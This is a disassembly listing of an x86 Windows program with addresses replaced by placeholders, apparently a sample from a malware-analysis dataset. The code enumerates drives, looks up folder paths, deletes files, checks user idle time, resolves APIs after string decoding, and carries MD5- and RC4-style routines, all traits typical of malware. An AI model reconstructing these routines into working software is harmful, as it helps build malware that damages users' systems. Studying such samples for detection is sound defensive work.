call sub_402a88
pop ecx
push eax
push [ ebp + 0x8 ]
call sub_40a1d9
add esp 0x14
test al al
je r-xdata
push [ ebp - 0x5 ]
lea eax [ ebp - 0x20010 ]
push eax
lea ecx [ edi + 0x228 ]
call sub_403dd6
mov [ eax ] 0x0
push [ ebp + 0x8 ]
mov ecx edi
call sub_4041eb
pop edi
pop esi
leave
retn 0x4
lea eax [ ebp - 0x20010 ]
push eax
mov ecx edi
call sub_40434d
sub_404529
push esi
push edi
mov edi ecx
mov esi [ edi + 0x228 ]
jmp r-xdata
test esi esi
jne r-xdata
mov ecx edi
call sub_40b443
test eax eax
jne r-xdata
pop edi
xor eax eax
pop esi
retn
lea eax [ esi + 0x4 ]
push eax
mov ecx edi
call sub_403e3a
mov ecx edi
call sub_40423b
mov esi [ esi ]
sub_40455d
push esi
mov esi ecx
call sub_40b553
and [ esi + 0x1c ] 0x0
push 0x0
lea eax [ esi + 0x24 ]
push rw-data
push eax
mov [ esi ] rw-data
call sub_409cdd
push 0x0
lea eax [ esi + 0x124 ]
push rw-data
push eax
call sub_409cdd
and [ esi + 0x224 ] 0x0
add esp 0x18
mov [ esi + 0x20 ] 0xa
mov eax esi
pop esi
retn
sub_4045a7
push ebp
mov ebp esp
sub esp 0x400
push esi
push edi
lea eax [ ebp - 0x400 ]
push eax
push 0x400
mov edi ecx
call [ GetLogicalDriveStringsA@IAT ]
cmp [ ebp - 0x400 ] 0x0
lea esi [ ebp - 0x400 ]
je r-xdata
pop edi
xor eax eax
pop esi
leave
retn
push esi
call [ GetDriveTypeA@IAT ]
cmp eax 0x3
je r-xdata
push esi
mov ecx edi
call sub_403e3a
mov ecx edi
call sub_40423b
cmp eax 0x4
jne r-xdata
push esi
call sub_409c76
lea esi [ esi + eax + 0x1 ]
cmp [ esi ] 0x0
pop ecx
jne r-xdata
sub_40460b
push ebp
mov ebp esp
sub esp 0x2000
push esi
push edi
mov esi 0x1000
lea eax [ ebp - 0x2000 ]
push esi
push eax
mov edi ecx
call sub_405388
lea eax [ ebp - 0x1000 ]
push esi
push eax
call sub_405388
add esp 0x10
push rw-data
mov ecx edi
call sub_40434d
push 0x3d
push esi
lea eax [ ebp - 0x2000 ]
push eax
push rw-data
call sub_402a88
pop ecx
push eax
push [ ebp + 0x8 ]
call sub_40a1d9
add esp 0x14
test al al
je r-xdata
push [ ebp + 0x8 ]
mov ecx edi
call sub_4041eb
pop edi
pop esi
leave
retn 0x4
lea eax [ ebp - 0x1000 ]
push eax
xor eax eax
push eax
push eax
push 0x1c
push eax
call [ SHGetFolderPathA@IAT ]
lea eax [ ebp - 0x1000 ]
push eax
call sub_40a052
lea eax [ ebp - 0x2000 ]
push eax
lea eax [ ebp - 0x1000 ]
push eax
call sub_409cb9
lea eax [ ebp - 0x1000 ]
push eax
call sub_40a052
add esp 0x10
lea eax [ ebp - 0x1000 ]
push eax
mov ecx edi
call sub_403e3a
sub_4046cb
push ebp
mov ebp esp
sub esp 0x2000
push esi
push 0x3d
push 0x2000
lea eax [ ebp - 0x2000 ]
push eax
push rw-data
mov esi ecx
call sub_402a88
pop ecx
push eax
push [ ebp + 0x8 ]
call sub_40a1d9
add esp 0x14
test al al
je r-xdata
push [ ebp + 0x8 ]
mov ecx esi
call sub_4041eb
pop esi
leave
retn 0x4
lea eax [ ebp - 0x2000 ]
push eax
mov ecx esi
call sub_40434d
sub_40471d
push ebp
mov ebp esp
sub esp 0x2000
push esi
push 0x3d
push 0x2000
lea eax [ ebp - 0x2000 ]
push eax
push rw-data
mov esi ecx
call sub_402a88
pop ecx
push eax
push [ ebp + 0x8 ]
call sub_40a1d9
add esp 0x14
test al al
je r-xdata
pop esi
leave
retn 0x4
lea eax [ ebp - 0x2000 ]
push eax
mov ecx esi
call sub_40434d
sub_404765
push esi
mov esi ecx
call sub_40455d
or [ esi + 0x228 ] 0xffffffff
xor eax eax
push eax
push eax
push 0x1
push eax
mov [ esi ] rw-data
call [ CreateEventA@IAT ]
mov [ esi + 0x22c ] eax
mov eax esi
pop esi
retn
sub_404796
push ebp
mov ebp esp
sub esp 0x404
push ebx
push esi
mov esi ecx
mov eax [ esi - 0x1d1e ]
mov eax [ eax + 0xc ]
push edi
lea ecx [ eax + esi - 0x1d1e ]
call sub_40a920
push 0x3d
mov ebx eax
mov edi 0x400
push edi
lea eax [ ebp - 0x404 ]
push eax
push rw-data
call sub_402a88
pop ecx
push eax
push [ ebp + 0x8 ]
call sub_40a1d9
add esp 0x14
test al al
je r-xdata
mov eax [ esi - 0x1d1e ]
mov eax [ eax + 0xc ]
push ebx
push [ ebp - 0x4 ]
lea ecx [ eax + esi - 0x1d1e ]
call sub_40a8bf
push 0x3d
push edi
lea eax [ ebp - 0x404 ]
push eax
push rw-data
mov [ ebp - 0x404 ] 0x0
call sub_402a88
pop ecx
push eax
push [ ebp + 0x8 ]
call sub_40a1d9
add esp 0x14
test al al
je r-xdata
lea eax [ ebp - 0x404 ]
push eax
call sub_40a0a6
pop ecx
mov [ ebp - 0x4 ] eax
pop edi
pop esi
pop ebx
leave
retn 0x4
lea eax [ ebp - 0x404 ]
push eax
lea ecx [ esi - 0x1f26 ]
call sub_40ab22
sub_404853
push esi
push 0x0
push [ esp + 0x10 ]
mov esi ecx
lea eax [ esi + 0x1dd6 ]
push eax
call sub_409cdd
add esp 0xc
push [ esp + 0x8 ]
mov ecx esi
call sub_40b01e
test al al
pop esi
je r-xdata
retn 0x8
push [ esp + 0x4 ]
call [ DeleteFileA@IAT ]
mov al 0x1
sub_40488a
push esi
push [ esp + 0xc ]
mov esi ecx
push [ esp + 0xc ]
call sub_40afaf
push rw-data
push [ esp + 0xc ]
call sub_409cb9
add esi 0x1dd6
push esi
push [ esp + 0x14 ]
call sub_409cb9
add esp 0x10
pop esi
retn 0x8
sub_4048bf
push esi
mov esi ecx
lea eax [ esi + 0x1dd6 ]
push edi
push eax
call sub_409c76
pop ecx
mov ecx esi
mov edi eax
call sub_40af8d
add eax edi
pop edi
pop esi
retn
sub_4048de
push ebp
mov ebp esp
push ecx
push ecx
lea eax [ ebp - 0x8 ]
push eax
mov [ ebp - 0x8 ] 0x8
call [ GetLastInputInfo@IAT ]
call [ GetTickCount@IAT ]
mov ecx [ ebp + 0x8 ]
sub eax [ ebp - 0x4 ]
imul ecx ecx 0x3e8
cmp eax ecx
mov eax [ ebp + 0xc ]
jb r-xdata
leave
retn
mov eax [ ebp + 0x10 ]
sub_40492d
push ebx
xor ebx ebx
push edi
xor edi edi
inc ebx
cmp [ esp + 0x10 ] edi
jle r-xdata
pop edi
pop ebx
retn 0x8
push esi
mov eax [ ecx - 0x4 ]
mov esi [ eax + 0x4 ]
mov eax ebx
cdq
idiv [ esi + ecx ]
mov eax [ esp + 0x10 ]
mov al [ edi + eax ]
add ebx ebx
add edx esi
inc edi
cmp edi [ esp + 0x14 ]
mov [ edx + ecx + 0x5 ] al
jl r-xdata
pop esi
sub_404963
push ebx
push esi
mov esi ecx
mov eax [ esi + 0x208 ]
mov [ esi ] rw-data
mov [ esi + 0x246 ] rw-data
mov [ esi + 0x1e16 ] rw-data
mov [ esi + 0x2266 ] rw-data
push edi
lea edi [ esi + 0x1e2b ]
mov [ edi ] rw-data
lea ebx [ esi + 0x204d ]
mov [ ebx ] rw-data
mov eax [ eax + 0x4 ]
mov [ eax + esi + 0x208 ] rw-data
mov eax [ esi + 0x208 ]
mov eax [ eax + 0x8 ]
mov [ eax + esi + 0x208 ] rw-data
mov eax [ esi + 0x208 ]
mov eax [ eax + 0xc ]
mov [ eax + esi + 0x208 ] rw-data
mov eax [ esi + 0x208 ]
mov eax [ eax + 0x14 ]
mov [ eax + esi + 0x208 ] rw-data
mov eax [ esi + 0x208 ]
mov eax [ eax + 0x14 ]
mov [ eax + esi + 0x210 ] rw-data
mov eax [ esi + 0x208 ]
mov eax [ eax + 0xc ]
lea ecx [ eax - 0x24a7 ]
mov [ eax + esi + 0x204 ] ecx
lea ecx [ esi + 0x258b ]
call sub_406361
mov ecx ebx
call sub_4032e3
mov ecx edi
call sub_40a626
pop edi
mov ecx esi
pop esi
pop ebx
jmp sub_402e43
_start
push ebp
mov ebp esp
sub esp 0x2718
push ebx
push esi
push edi
push rw-data
call sub_402a88
pop ecx
push eax
call [ LoadLibraryA@IAT ]
mov esi eax
xor edi edi
cmp esi edi
je r-xdata
push rw-data
call sub_406537
pop ecx
mov [ rw-data ] edi
call [ GetCurrentProcess@IAT ]
mov esi [ SetPriorityClass@IAT ]
mov ebx eax
push 0x40
push ebx
call esi
push 0x100000
push ebx
call esi
push edi
push ebx
call [ SetProcessPriorityBoost@IAT ]
call [ GetEnvironmentStrings@IAT ]
push edi
push edi
call [ GetConsoleCursorInfo@IAT ]
call [ GetConsoleCP@IAT ]
push edi
push edi
call [ GetConsoleMode@IAT ]
call [ GetConsoleOutputCP@IAT ]
push 0x1
lea ecx [ ebp - 0x2718 ]
call sub_403753
push edi
lea ecx [ ebp - 0x2718 ]
call sub_40335a
lea ecx [ ebp - 0x2718 ]
call sub_404963
push edi
call [ ExitProcess@IAT ]
push rw-data
call sub_402a88
pop ecx
push eax
push esi
call [ GetProcAddress@IAT ]
cmp eax edi
je r-xdata
push 0x2
call eax
sub_404b4b
push ebp
mov ebp esp
sub esp 0x48
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi ]
mov ebx [ esi + 0x8 ]
push edi
mov edi [ esi + 0x4 ]
mov [ ebp + 0x8 ] eax
mov eax [ esi + 0xc ]
push 0x40
push [ ebp + 0xc ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x48 ]
push eax
mov [ ebp - 0x4 ] edi
call sub_405366
mov eax edi
not eax
and eax [ ebp - 0x8 ]
mov ecx ebx
and ecx edi
or eax ecx
add eax [ ebp - 0x48 ]
mov ecx [ ebp + 0x8 ]
lea eax [ eax + ecx - 0x28955b88 ]
rol eax 0x7
add eax edi
mov ecx eax
not ecx
and ecx ebx
mov edx edi
and edx eax
or ecx edx
add ecx [ ebp - 0x44 ]
mov edx [ ebp - 0x8 ]
lea ecx [ ecx + edx - 0x173848aa ]
rol ecx 0xc
add ecx eax
mov edx ecx
not edx
and edx edi
mov edi ecx
and edi eax
or edx edi
add edx [ ebp - 0x40 ]
lea edi [ edx + ebx + 0x242070db ]
ror edi 0xf
add edi ecx
mov edx edi
not edx
and edx eax
mov ebx ecx
and ebx edi
or edx ebx
add edx [ ebp - 0x3c ]
mov ebx [ ebp - 0x4 ]
lea edx [ edx + ebx - 0x3e423112 ]
ror edx 0xa
add edx edi
mov [ ebp - 0x8 ] edi
and edi edx
mov ebx edx
not ebx
and ebx ecx
or ebx edi
add ebx [ ebp - 0x38 ]
mov edi edx
lea eax [ ebx + eax - 0xa83f051 ]
rol eax 0x7
add eax edx
mov [ ebp + 0x8 ] eax
and edi [ ebp + 0x8 ]
not eax
and eax [ ebp - 0x8 ]
or eax edi
add eax [ ebp - 0x34 ]
lea ecx [ eax + ecx + 0x4787c62a ]
rol ecx 0xc
add ecx [ ebp + 0x8 ]
mov eax ecx
not eax
and eax edx
mov edi ecx
and edi [ ebp + 0x8 ]
mov ebx ecx
or eax edi
add eax [ ebp - 0x30 ]
mov edi [ ebp - 0x8 ]
lea eax [ eax + edi - 0x57cfb9ed ]
ror eax 0xf
add eax ecx
and ebx eax
mov edi eax
not edi
and edi [ ebp + 0x8 ]
or edi ebx
add edi [ ebp - 0x2c ]
mov ebx eax
lea edx [ edi + edx - 0x2b96aff ]
ror edx 0xa
add edx eax
and ebx edx
mov edi edx
not edi
and edi ecx
or edi ebx
add edi [ ebp - 0x28 ]
mov ebx [ ebp + 0x8 ]
lea edi [ edi + ebx + 0x698098d8 ]
rol edi 0x7
add edi edx
mov [ ebp - 0x4 ] edx
and edx edi
mov ebx edi
not ebx
and ebx eax
or ebx edx
add ebx [ ebp - 0x24 ]
lea ecx [ ebx + ecx - 0x74bb0851 ]
rol ecx 0xc
add ecx edi
mov edx ecx
not edx
and edx [ ebp - 0x4 ]
mov ebx ecx
and ebx edi
or edx ebx
add edx [ ebp - 0x20 ]
mov ebx ecx
lea eax [ edx + eax - 0xa44f ]
ror eax 0xf
add eax ecx
and ebx eax
mov edx eax
not edx
and edx edi
or edx ebx
add edx [ ebp - 0x1c ]
mov ebx [ ebp - 0x4 ]
lea edx [ edx + ebx - 0x76a32842 ]
ror edx 0xa
add edx eax
mov [ ebp - 0x8 ] eax
and eax edx
mov ebx edx
not ebx
and ebx ecx
or ebx eax
add ebx [ ebp - 0x18 ]
mov eax edx
lea edi [ ebx + edi + 0x6b901122 ]
rol edi 0x7
add edi edx
mov [ ebp + 0x8 ] edi
and eax [ ebp + 0x8 ]
not edi
and edi [ ebp - 0x8 ]
or edi eax
add edi [ ebp - 0x14 ]
lea ecx [ edi + ecx - 0x2678e6d ]
rol ecx 0xc
add ecx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] ecx
not [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
and eax edx
mov edi ecx
and edi [ ebp + 0x8 ]
mov ebx ecx
or eax edi
add eax [ ebp - 0x10 ]
mov edi [ ebp - 0x8 ]
lea eax [ eax + edi - 0x5986bc72 ]
ror eax 0xf
add eax ecx
and ebx eax
mov [ ebp - 0x8 ] eax
not [ ebp - 0x8 ]
mov edi [ ebp - 0x8 ]
and edi [ ebp + 0x8 ]
or edi ebx
add edi [ ebp - 0xc ]
mov ebx ecx
lea edx [ edi + edx + 0x49b40821 ]
mov edi [ ebp - 0x4 ]
and edi eax
ror edx 0xa
add edx eax
and ebx edx
or edi ebx
add edi [ ebp - 0x44 ]
mov ebx [ ebp + 0x8 ]
lea edi [ edi + ebx - 0x9e1da9e ]
mov ebx [ ebp - 0x8 ]
rol edi 0x5
add edi edx
and ebx edx
mov [ ebp + 0x8 ] edi
mov [ ebp - 0x8 ] ebx
mov ebx eax
and ebx edi
mov edi [ ebp - 0x8 ]
or edi ebx
add edi [ ebp - 0x30 ]
lea ecx [ edi + ecx - 0x3fbf4cc0 ]
rol ecx 0x9
add ecx [ ebp + 0x8 ]
mov edi edx
not edi
and edi [ ebp + 0x8 ]
mov ebx ecx
and ebx edx
or edi ebx
add edi [ ebp - 0x1c ]
mov ebx ecx
lea eax [ edi + eax + 0x265e5a51 ]
mov edi [ ebp + 0x8 ]
rol eax 0xe
add eax ecx
mov [ ebp - 0x8 ] eax
and eax [ ebp + 0x8 ]
not edi
and edi ecx
or edi eax
add edi [ ebp - 0x48 ]
mov eax ecx
not eax
lea edx [ edi + edx - 0x16493856 ]
mov edi [ ebp - 0x8 ]
and eax edi
ror edx 0xc
add edx edi
and ebx edx
or eax ebx
add eax [ ebp - 0x34 ]
mov ebx [ ebp + 0x8 ]
lea eax [ eax + ebx - 0x29d0efa3 ]
rol eax 0x5
add eax edx
mov [ ebp + 0x8 ] eax
mov eax edi
not eax
and eax edx
mov ebx edi
and ebx [ ebp + 0x8 ]
or eax ebx
add eax [ ebp - 0x20 ]
lea ecx [ eax + ecx + 0x2441453 ]
mov eax edx
rol ecx 0x9
add ecx [ ebp + 0x8 ]
not eax
and eax [ ebp + 0x8 ]
mov ebx ecx
and ebx edx
or eax ebx
add eax [ ebp - 0xc ]
lea eax [ eax + edi - 0x275e197f ]
mov edi [ ebp + 0x8 ]
rol eax 0xe
add eax ecx
not edi
and edi ecx
mov ebx eax
and ebx [ ebp + 0x8 ]
or edi ebx
add edi [ ebp - 0x38 ]
mov ebx ecx
lea edx [ edi + edx - 0x182c0438 ]
ror edx 0xc
add edx eax
and ebx edx
mov [ ebp - 0x4 ] edx
mov edi ecx
not edi
and edi eax
or edi ebx
add edi [ ebp - 0x24 ]
mov ebx [ ebp + 0x8 ]
lea edi [ edi + ebx + 0x21e1cde6 ]
rol edi 0x5
add edi edx
mov ebx eax
not ebx
and ebx edx
mov edx eax
and edx edi
or ebx edx
add ebx [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
lea ecx [ ebx + ecx - 0x3cc8f82a ]
not edx
and edx edi
rol ecx 0x9
add ecx edi
mov ebx ecx
and ebx [ ebp - 0x4 ]
or edx ebx
add edx [ ebp - 0x3c ]
lea eax [ edx + eax - 0xb2af279 ]
rol eax 0xe
add eax ecx
mov edx edi
not edx
and edx ecx
mov ebx eax
and ebx edi
or edx ebx
add edx [ ebp - 0x28 ]
mov ebx [ ebp - 0x4 ]
lea edx [ edx + ebx + 0x455a14ed ]
ror edx 0xc
add edx eax
mov [ ebp - 0x4 ] edx
mov edx ecx
not edx
and edx eax
mov ebx ecx
and ebx [ ebp - 0x4 ]
or edx ebx
add edx [ ebp - 0x14 ]
lea edi [ edx + edi - 0x561c16fb ]
rol edi 0x5
add edi [ ebp - 0x4 ]
mov [ ebp + 0x8 ] edi
mov edx eax
not edx
and edx [ ebp - 0x4 ]
mov edi eax
and edi [ ebp + 0x8 ]
or edx edi
add edx [ ebp - 0x40 ]
mov edi [ ebp + 0x8 ]
lea ecx [ edx + ecx - 0x3105c08 ]
mov edx [ ebp - 0x4 ]
rol ecx 0x9
add ecx edi
not edx
and edx edi
mov ebx ecx
and ebx [ ebp - 0x4 ]
or edx ebx
add edx [ ebp - 0x2c ]
lea eax [ edx + eax + 0x676f02d9 ]
rol eax 0xe
add eax ecx
mov edx edi
not edx
and edx ecx
mov ebx eax
and ebx edi
or edx ebx
add edx [ ebp - 0x18 ]
mov ebx [ ebp - 0x4 ]
lea edx [ edx + ebx - 0x72d5b376 ]
ror edx 0xc
add edx eax
mov ebx ecx
xor ebx eax
xor ebx edx
add ebx [ ebp - 0x34 ]
lea edi [ ebx + edi - 0x5c6be ]
rol edi 0x4
add edi edx
mov ebx eax
xor ebx edx
xor ebx edi
add ebx [ ebp - 0x28 ]
lea ecx [ ebx + ecx - 0x788e097f ]
rol ecx 0xb
add ecx edi
mov ebx ecx
xor ebx edx
xor ebx edi
add ebx [ ebp - 0x1c ]
mov [ ebp + 0x8 ] ecx
lea eax [ ebx + eax + 0x6d9d6122 ]
rol eax 0x10
add eax ecx
xor [ ebp + 0x8 ] eax
mov ebx [ ebp + 0x8 ]
xor ebx edi
add ebx [ ebp - 0x10 ]
lea edx [ ebx + edx - 0x21ac7f4 ]
mov ebx [ ebp + 0x8 ]
ror edx 0x9
add edx eax
xor ebx edx
add ebx [ ebp - 0x44 ]
lea edi [ ebx + edi - 0x5b4115bc ]
rol edi 0x4
add edi edx
mov ebx eax
xor ebx edx
xor ebx edi
add ebx [ ebp - 0x38 ]
lea ebx [ ebx + ecx + 0x4bdecfa9 ]
rol ebx 0xb
add ebx edi
mov ecx ebx
xor ecx edx
xor ecx edi
add ecx [ ebp - 0x2c ]
lea eax [ ecx + eax - 0x944b4a0 ]
rol eax 0x10
add eax ebx
mov ecx ebx
xor ecx eax
mov [ ebp - 0x8 ] eax
mov eax ecx
xor eax edi
add eax [ ebp - 0x20 ]
lea eax [ eax + edx - 0x41404390 ]
mov edx [ ebp - 0x8 ]
ror eax 0x9
add eax [ ebp - 0x8 ]
xor ecx eax
add ecx [ ebp - 0x14 ]
lea ecx [ ecx + edi + 0x289b7ec6 ]
mov edi edx
xor edi eax
rol ecx 0x4
add ecx eax
xor edi ecx
add edi [ ebp - 0x48 ]
lea ebx [ edi + ebx - 0x155ed806 ]
rol ebx 0xb
add ebx ecx
mov edi ebx
xor edi eax
xor edi ecx
add edi [ ebp - 0x3c ]
mov [ ebp + 0x8 ] ebx
lea edi [ edi + edx - 0x2b10cf7b ]
rol edi 0x10
add edi ebx
xor [ ebp + 0x8 ] edi
mov edx [ ebp + 0x8 ]
xor edx ecx
add edx [ ebp - 0x30 ]
lea eax [ edx + eax + 0x4881d05 ]
mov edx [ ebp + 0x8 ]
ror eax 0x9
add eax edi
xor edx eax
add edx [ ebp - 0x24 ]
lea ecx [ edx + ecx - 0x262b2fc7 ]
rol ecx 0x4
add ecx eax
mov edx edi
xor edx eax
xor edx ecx
add edx [ ebp - 0x18 ]
lea edx [ edx + ebx - 0x1924661b ]
rol edx 0xb
add edx ecx
mov ebx edx
xor ebx eax
xor ebx ecx
add ebx [ ebp - 0xc ]
lea edi [ ebx + edi + 0x1fa27cf8 ]
rol edi 0x10
add edi edx
mov ebx edx
xor ebx edi
xor ebx ecx
add ebx [ ebp - 0x40 ]
lea eax [ ebx + eax - 0x3b53a99b ]
ror eax 0x9
add eax edi
mov ebx edx
not ebx
or ebx eax
xor ebx edi
add ebx [ ebp - 0x48 ]
lea ecx [ ebx + ecx - 0xbd6ddbc ]
rol ecx 0x6
add ecx eax
mov ebx edi
not ebx
or ebx ecx
xor ebx eax
add ebx [ ebp - 0x2c ]
lea edx [ ebx + edx + 0x432aff97 ]
rol edx 0xa
add edx ecx
mov ebx eax
not ebx
or ebx edx
xor ebx ecx
add ebx [ ebp - 0x10 ]
lea edi [ ebx + edi - 0x546bdc59 ]
rol edi 0xf
add edi edx
mov ebx ecx
not ebx
or ebx edi
xor ebx edx
add ebx [ ebp - 0x34 ]
lea eax [ ebx + eax - 0x36c5fc7 ]
ror eax 0xb
add eax edi
mov ebx edx
not ebx
or ebx eax
xor ebx edi
add ebx [ ebp - 0x18 ]
lea ecx [ ebx + ecx + 0x655b59c3 ]
rol ecx 0x6
add ecx eax
mov ebx edi
not ebx
or ebx ecx
xor ebx eax
add ebx [ ebp - 0x3c ]
lea edx [ ebx + edx - 0x70f3336e ]
rol edx 0xa
add edx ecx
mov ebx eax
not ebx
or ebx edx
xor ebx ecx
add ebx [ ebp - 0x20 ]
lea edi [ ebx + edi - 0x100b83 ]
rol edi 0xf
add edi edx
mov ebx ecx
not ebx
or ebx edi
xor ebx edx
add ebx [ ebp - 0x44 ]
lea eax [ ebx + eax - 0x7a7ba22f ]
ror eax 0xb
add eax edi
mov ebx edx
not ebx
or ebx eax
xor ebx edi
add ebx [ ebp - 0x28 ]
lea ecx [ ebx + ecx + 0x6fa87e4f ]
rol ecx 0x6
add ecx eax
mov ebx edi
not ebx
or ebx ecx
xor ebx eax
add ebx [ ebp - 0xc ]
lea edx [ ebx + edx - 0x1d31920 ]
rol edx 0xa
add edx ecx
mov ebx eax
not ebx
or ebx edx
xor ebx ecx
add ebx [ ebp - 0x30 ]
lea edi [ ebx + edi - 0x5cfebcec ]
rol edi 0xf
add edi edx
mov ebx ecx
not ebx
or ebx edi
xor ebx edx
add ebx [ ebp - 0x14 ]
lea ebx [ ebx + eax + 0x4e0811a1 ]
ror ebx 0xb
add ebx edi
mov eax edx
not eax
or eax ebx
xor eax edi
add eax [ ebp - 0x38 ]
push 0x40
lea eax [ eax + ecx - 0x8ac817e ]
rol eax 0x6
add eax ebx
add [ esi ] eax
mov ecx edi
not ecx
or ecx eax
xor ecx ebx
add ecx [ ebp - 0x1c ]
lea edx [ ecx + edx - 0x42c50dcb ]
rol edx 0xa
add edx eax
mov ecx ebx
not ecx
or ecx edx
xor ecx eax
add ecx [ ebp - 0x40 ]
add [ esi + 0xc ] edx
not eax
lea edi [ ecx + edi + 0x2ad7d2bb ]
rol edi 0xf
add edi edx
add [ esi + 0x8 ] edi
or eax edi
xor eax edx
add eax [ ebp - 0x24 ]
lea eax [ eax + ebx - 0x14792c6f ]
ror eax 0xb
add eax edi
add [ esi + 0x4 ] eax
lea eax [ ebp - 0x48 ]
push eax
call sub_405388
add esp 0x14
pop edi
pop esi
pop ebx
leave
retn
sub_40522c
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x10 ]
push edi
mov edi [ ebp + 0x10 ]
mov eax ecx
shr eax 0x3
mov edx edi
lea ecx [ ecx + edi * 8 ]
shl edx 0x3
and eax 0x3f
cmp ecx edx
mov [ esi + 0x10 ] ecx
jae r-xdata
push 0x40
mov ecx edi
shr ecx 0x1d
add [ esi + 0x14 ] ecx
pop ebx
sub ebx eax
cmp edi ebx
jb r-xdata
inc [ esi + 0x14 ]
and [ ebp + 0x8 ] 0x0
push ebx
push [ ebp + 0xc ]
lea eax [ eax + esi + 0x18 ]
push eax
call sub_405366
lea eax [ esi + 0x18 ]
push eax
push esi
call sub_404b4b
add esp 0x14
mov [ ebp + 0x8 ] ebx
add ebx 0x3f
jmp r-xdata
cmp ebx edi
jb r-xdata
mov eax [ ebp + 0xc ]
lea eax [ eax + ebx - 0x3f ]
push eax
push esi
call sub_404b4b
add [ ebp + 0x8 ] 0x40
pop ecx
pop ecx
add ebx 0x40
xor eax eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
sub edi ecx
push edi
add ecx edx
push ecx
lea eax [ eax + esi + 0x18 ]
push eax
call sub_405366
add esp 0xc
pop edi
pop esi
pop ebx
pop ebp
retn
sub_4052ca
push ebp
mov ebp esp
push ecx
push ecx
push esi
push edi
mov edi [ ebp + 0x8 ]
push 0x8
lea esi [ edi + 0x10 ]
lea eax [ ebp - 0x8 ]
push esi
push eax
call sub_405366
mov eax [ esi ]
add esp 0xc
shr eax 0x3
push 0x38
and eax 0x3f
pop ecx
cmp eax ecx
jb r-xdata
sub ecx eax
push ecx
push rw-data
push edi
call sub_40522c
push 0x8
lea eax [ ebp - 0x8 ]
push eax
push edi
call sub_40522c
add esp 0x18
pop edi
pop esi
leave
retn
push 0x78
pop ecx
sub_405366
mov ecx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
cmp ecx eax
je r-xdata
xor al al
retn
cmp [ esp + 0xc ] 0x0
je r-xdata
mov dl [ ecx ]
mov [ eax ] dl
inc eax
inc ecx
dec [ esp + 0xc ]
jne r-xdata
sub_4053a4
cmp [ esp + 0xc ] 0x0
mov al 0x1
je r-xdata
retn
mov ecx [ esp + 0x4 ]
push esi
mov esi [ esp + 0xc ]
mov dl [ ecx ]
cmp dl [ esi ]
sete dl
and al dl
inc ecx
inc esi
dec [ esp + 0x10 ]
jne r-xdata
pop esi
sub_4053c9
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push esi
push edi
mov edi [ ebp + 0xc ]
cmp edi ecx
je r-xdata
mov eax [ ebp + 0x10 ]
xor esi esi
test eax eax
jle r-xdata
mov esi [ ebp + 0x10 ]
xor edx edx
test esi esi
jle r-xdata
pop edi
pop esi
pop ebp
retn
mov [ ebp + 0xc ] 0x1
sub [ ebp + 0xc ] ecx
lea eax [ ecx + eax - 0x1 ]
push ebx
lea eax [ ecx + esi - 0x1 ]
mov dl [ esi + ecx ]
mov bl [ eax ]
mov [ esi + ecx ] bl
mov [ eax ] dl
mov edx [ ebp + 0xc ]
inc esi
dec eax
add edx eax
cmp esi edx
jl r-xdata
pop ebx
mov cl [ edx + edi ]
inc edx
mov [ eax ] cl
dec eax
cmp edx esi
jl r-xdata
jmp r-xdata
sub_405424
push ebp
mov ebp esp
push ecx
xor eax eax
mov edx ecx
mov [ edx ] al
inc eax
inc edx
cmp ax 0x100
jl r-xdata
push ebx
push esi
push edi
xor dl dl
mov [ ecx + 0x100 ] 0x0
mov [ ecx + 0x101 ] 0x0
xor esi esi
mov edi ecx
mov [ ebp - 0x4 ] 0x100
mov bl [ edi ]
movzx esi dl
mov [ ecx + 0x102 ] bl
mov dl [ esi + ecx ]
mov [ edi ] dl
mov dl [ ecx + 0x102 ]
inc eax
mov [ esi + ecx ] dl
cdq
idiv [ ebp + 0xc ]
inc edi
dec [ ebp - 0x4 ]
jne r-xdata
dec edx
or edx 0xffffff00
inc edx
mov bl [ edi ]
movzx eax dl
mov edx [ ebp + 0x8 ]
movzx edx [ eax + edx ]
movzx ebx bl
add edx esi
add edx ebx
and edx 0x800000ff
jns r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_4054a2
push ebp
mov ebp esp
sub esp 0xc
mov al [ ecx + 0x100 ]
mov dl [ ecx + 0x101 ]
and [ ebp - 0x8 ] 0x0
push ebx
push esi
push edi
movzx eax al
movzx esi dl
jmp r-xdata
lea edx [ eax + 0x1 ]
and edx 0x800000ff
jns r-xdata
movzx eax dl
mov bl [ eax + ecx ]
movzx ebx bl
add ebx esi
and ebx 0x800000ff
jns r-xdata
dec edx
or edx 0xffffff00
inc edx
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x1 ] bl
mov bl [ eax + ecx ]
movzx esi [ ebp - 0x1 ]
mov [ ecx + 0x102 ] bl
mov bl [ esi + ecx ]
mov [ eax + ecx ] bl
mov bl [ ecx + 0x102 ]
mov [ esi + ecx ] bl
mov [ ebp - 0xc ] esi
movsx esi [ ebp - 0x8 ]
add esi edi
movzx edi [ eax + ecx ]
movzx ebx bl
add ebx edi
and ebx 0x800000ff
jns r-xdata
dec ebx
or ebx 0xffffff00
inc ebx
movzx edi bl
mov bl [ edi + ecx ]
xor [ esi ] bl
je r-xdata
dec ebx
or ebx 0xffffff00
inc ebx
mov al [ ebp - 0x1 ]
pop edi
pop esi
mov [ ecx + 0x100 ] dl
mov [ ecx + 0x101 ] al
pop ebx
leave
retn 0x4
inc [ ebp - 0x8 ]
cmp [ ebp - 0x8 ] 0x400
jl r-xdata
mov esi [ ebp - 0xc ]
sub_405567
push ebx
mov ebx [ LoadLibraryA@IAT ]
push esi
push edi
push rw-data
mov esi ecx
call ebx
test eax eax
mov edi [ GetProcAddress@IAT ]
mov [ esi + 0x19 ] eax
je r-xdata
push rw-data
call sub_402a88
pop ecx
push eax
call ebx
test eax eax
mov [ esi + 0x1d ] eax
je r-xdata
push rw-data
mov [ esi + 0x18 ] 0x1
call sub_402a88
pop ecx
push eax
push [ esi + 0x19 ]
call edi
xor ecx ecx
test eax eax
setne cl
test cl cl
mov [ esi ] eax
mov [ esi + 0x18 ] cl
je r-xdata
mov al [ esi + 0x18 ]
pop edi
pop esi
pop ebx
retn
